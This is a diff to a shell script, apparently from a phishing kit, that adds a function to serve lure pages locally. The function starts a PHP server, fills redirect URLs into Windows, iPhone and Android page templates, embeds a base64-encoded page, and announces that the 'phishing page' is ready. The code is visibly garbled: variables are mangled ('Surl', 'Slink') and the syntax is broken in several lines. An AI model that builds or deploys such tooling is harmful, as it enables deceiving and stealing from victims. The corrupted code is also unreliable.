@@ -325,5 +325,44 @@ banner
 dependencies
 #start1 # DISABLED
 redirect
-ngrok_server
+localhost
+
+start_localhost() (
+
+fuser -k 3333/tcp > /dev/null 2>&1
+
+printf "\e[1:92m[\e[0m+\e[1;92m] Starting PHP server at \e[0m\e[1;77mhttp://localhost:3333\e[0m\n"
+
+php-S 127.0.0.1:3333>/dev/null 2>&1 &
+
+sleep 2
+
+link="http://localhost:3333"
+
+url=$redirect
+
+payload_name="index"
+
+printf "\e[1:77m[\e[0m\e[1;33m+\e[0m\e[1;77m) Building webpages...\e[0m\n"
+
+sed 's+forwarding_url+'Surl'+g' post.php > cat.php
+
+sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'Surl'+g' > win2.html
+
+sed 's+forwarding_link+'Slink'+g' phone.html | sed 's+forwarding_url+'Surl'+g' > iphone2.html
+
+sed 's+forwarding_link+'Slink'+g' droid.html | sed 's+forwarding_url+'Surl'+g' > droid2.html
+
+IFS=S'\n'
+
+data_base64-5(base64-w0 win2.html)
+
+temp64="$(echo "${data_base64)" | sed 's/[\\&*/+!]/\\&/g')"
+
+sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'Spayload_name'+g' | sed 's+data_base64+'S[temp64]'+g'> index2.html
+
+printf "\e[1;92m[\e[0m+\e[1:92m] Localhost phishing page ready at:\e[0m\e[1:77m %s\e[0m\n" "$link"
+
+checkfound
+
 
